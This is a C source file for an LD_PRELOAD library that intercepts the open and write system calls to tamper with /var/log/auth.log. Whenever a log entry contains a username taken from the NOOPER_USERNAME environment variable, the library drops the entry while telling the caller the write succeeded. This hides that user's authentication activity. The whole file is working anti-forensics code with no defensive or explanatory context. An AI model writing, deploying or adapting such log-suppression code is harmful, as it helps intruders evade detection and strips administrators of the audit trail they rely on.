#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdarg.h>

// Original function pointers
static int (*original_open)(const char *pathname, int flags, ...) = NULL;
static ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;

// Track fd for /var/log/auth.log
static int target_fd = -1;

int open(const char *pathname, int flags, ...) {
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);

    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }
    int fd = original_open(pathname, flags, mode);
    if (fd != -1 && strcmp(pathname, "/var/log/auth.log") == 0) {
        target_fd = fd;
    }
    return fd;
}

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }
    if (fd == target_fd) {
        const char *nooper_username = getenv("NOOPER_USERNAME");
        if (nooper_username && nooper_username[0] != '\0') {
            char *temp_buf = malloc(count + 1);
            if (!temp_buf) {
                return original_write(fd, buf, count);
            }
            memcpy(temp_buf, buf, count);
            temp_buf[count] = '\0';
            if (strstr(temp_buf, nooper_username)) {
                free(temp_buf);
                return count; // Suppress write
            }
            ssize_t result = original_write(fd, temp_buf, count);
            free(temp_buf);
            return result;
        }
    }
    return original_write(fd, buf, count);
}

